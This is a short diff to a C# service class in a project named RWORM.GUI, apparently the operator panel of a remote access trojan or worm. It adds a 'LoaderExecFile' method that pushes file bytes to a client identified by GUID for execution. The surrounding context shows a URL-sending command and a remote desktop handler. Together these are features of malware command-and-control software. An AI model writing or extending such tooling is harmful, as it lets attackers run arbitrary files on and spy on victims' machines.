@@ -158,6 +158,8 @@ namespace RWORM.GUI.Services
             return GuiSend(0x70, guid, Encoding.UTF8.GetBytes(url));
         }
 
+        public Task LoaderExecFile(string guid, byte[] fileBytes, Action<byte[]>? cb = null) => RunFileTaskAsync(guid, fileBytes, cb);
+
         // ── Remote Desktop ────────────────────────────────────────────────────
         public void RegisterRDHandler(string guid, Action<byte[]> cb)
             => RegisterHandler(guid, 0x81, cb);
